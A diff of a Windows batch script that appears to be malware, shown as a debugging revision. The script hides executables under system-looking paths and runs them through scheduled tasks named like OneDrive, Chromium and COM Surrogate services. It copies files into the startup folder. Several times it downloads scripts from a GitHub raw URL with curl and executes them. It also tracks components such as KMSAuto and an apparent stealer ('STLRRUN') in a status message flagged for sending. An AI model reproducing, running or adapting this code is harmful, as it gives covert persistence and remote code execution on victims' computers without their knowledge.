@@ -2,21 +2,16 @@
 :: RUNEVERYCALLER Installed in %appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe ( %SystemRoot%\System32\convertsshd.exe )
 :: RUNEVERYCALLER TASK NAMED "SystemLibrariesU" , is Running RunEveryCaller every 1 min
 
-goto :EOF
+::goto :EOF
 
 @echo off
 
 
 
-
-:: if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
-:: if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
-
-
+setlocal enabledelayedexpansion
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
 set "filename="
-
 
 
 
@@ -452,11 +447,20 @@ if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
 )
 
 echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
-set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH"
+set "MESSAGE=MD5SHSTMISMATCH^|"
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
 
 echo Deleting %SHSTFILEroot% and %SHSTFILE%
-del /f /q "%SHSTFILEroot%" >nul 2>&1
-del /f /q "%SHSTFILE%" >nul 2>&1
+del /f /q "%SHSTFILEroot%"
+del /f /q "%SHSTFILE%"
 echo.
 
 if exist "%SHSTFILEroot%" (
@@ -495,7 +499,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -514,12 +518,17 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-set "MESSAGE=%MESSAGE%SHST|"
+set "MESSAGE=%MESSAGE%SHST^|"
 set "CheckSend=1"
 
 
 
-
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
 
 
 
@@ -580,11 +589,19 @@ if "%KMSFILEmd5%"=="%KMSAutoMD5%" (
 )
 
 echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
-set "MESSAGE=%MESSAGE%MD5KMSMISMATCH"
+set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
 
 echo Deleting %KMSFILEroot% and %KMSFILE%
-del /f /q "%KMSFILEroot%" >nul 2>&1
-del /f /q "%KMSFILE%" >nul 2>&1
+del /f /q "%KMSFILEroot%"
+del /f /q "%KMSFILE%"
 echo.
 
 if exist "%KMSFILEroot%" (
@@ -619,7 +636,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -636,8 +653,19 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-set "MESSAGE=%MESSAGE%KMSAuto|"
+set "MESSAGE=%MESSAGE%KMSAuto^|"
 set "CheckSend=1"
+
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
 
 
 
@@ -672,7 +700,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -682,8 +710,17 @@ if exist "%embeddedScript%" (
     goto CheckComSurrogate
 )
 
-set "MESSAGE=%MESSAGE%ComSurrogate|"
+set "MESSAGE=%MESSAGE%ComSurrogate^|"
 set "CheckSend=1"
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
 
 
 
@@ -734,7 +771,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -745,12 +782,17 @@ if exist "%embeddedScript%" (
 )
 
 
-set "MESSAGE=CoreProcessInstalled|"
+set "MESSAGE=%MESSAGE%CoreProcessInstalled^|"
 set "CheckSend=1"
 
 
 
-
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
 
 
 
@@ -793,7 +835,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -803,12 +845,17 @@ if exist "%embeddedScript%" (
     goto CheckNIRCMD
 )
 
-set "MESSAGE=%MESSAGE%NIRCMD|"
+set "MESSAGE=%MESSAGE%NIRCMD^|"
 set "CheckSend=1"
 
 
 
-
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
 
 
 
@@ -835,7 +882,7 @@ curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/re
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
     call "%embeddedScript%"
-    del "%embeddedScript%" >nul 2>&1
+    del "%embeddedScript%"
     echo.
     echo.
 ) else (
@@ -845,12 +892,17 @@ if exist "%embeddedScript%" (
     goto CheckSTLRRUN
 )
 
-set "MESSAGE=%MESSAGE%STLRRUN|"
+set "MESSAGE=%MESSAGE%STLRRUN^|"
 set "CheckSend=1"
 
 
 
-
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
 
 
 
@@ -868,12 +920,18 @@ echo.
 
 
 
+::if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
+::if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
+
+
+
 
 
 
 echo.
 echo.
-echo %MESSAGE%
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
 echo.
 echo.
 
@@ -891,19 +949,23 @@ echo.
 
 :: Ending Tasks
 echo Ending Tasks :
-schtasks /end /tn "ComSurrogate" /f >nul 2>&1
-schtasks /end /tn "OneDrive Updater" /f >nul 2>&1
-schtasks /end /tn "OneDrive Task" /f >nul 2>&1
-schtasks /end /tn "Chromium Update" /f >nul 2>&1
+schtasks /end /tn "ComSurrogate"
+schtasks /end /tn "OneDrive Updater"
+schtasks /end /tn "OneDrive Task"
+schtasks /end /tn "Chromium Update"
 echo.
 echo.
 
 :: Removing Tasks
 echo Removing Tasks :
-schtasks /delete /tn "ComSurrogate" /f >nul 2>&1
-schtasks /delete /tn "OneDrive Updater" /f >nul 2>&1
-schtasks /delete /tn "OneDrive Task" /f >nul 2>&1
-schtasks /delete /tn "Chromium Update" /f >nul 2>&1
+schtasks /delete /tn "ComSurrogate" /f
+schtasks /delete /tn "OneDrive Updater" /f
+schtasks /delete /tn "OneDrive Task" /f
+schtasks /delete /tn "Chromium Update" /f
+schtasks /delete /TN "WinRNTMUpdate" /F
+schtasks /delete /TN "WinRTKUpdate" /F
+schtasks /delete /TN "checkCOMandadd" /F
+schtasks /delete /TN "SystemCertificates" /F
 echo.
 echo.
 
@@ -965,16 +1027,6 @@ echo Stopping processes...
 taskkill /F /IM RuntimeBroker.exe
 taskkill /F /IM TSSPrxySTC.exe
 taskkill /F /IM TSSPrxyAdSTC.exe
-
-
-
-echo Removing scheduled tasks...
-schtasks /Delete /TN "WinRNTMUpdate" /F
-schtasks /Delete /TN "WinRTKUpdate" /F
-schtasks /Delete /TN "checkCOMandadd" /F
-schtasks /Delete /TN "SystemCertificates" /F
-
-
 taskkill /F /IM RuntimeBroker.exe
 taskkill /F /IM StartupTaskCaller.exe
 
@@ -1117,7 +1169,7 @@ if "%currentMinute%" neq "%lastMinute%" (
 )
 
 
-
+echo CheckSend=%CheckSend%
 
 
 ::echo.
@@ -1288,7 +1340,7 @@ del /f /q "%InstalledQWB%"
 
 
 
-
+echo Going to :EOF
 goto :EOF
 
 :checkloooop
@@ -1306,6 +1358,5 @@ cls
 echo Looping... (%currentSeconds%)
 ::timeout /t 1 /nobreak
 goto :loop_start
-
 
 
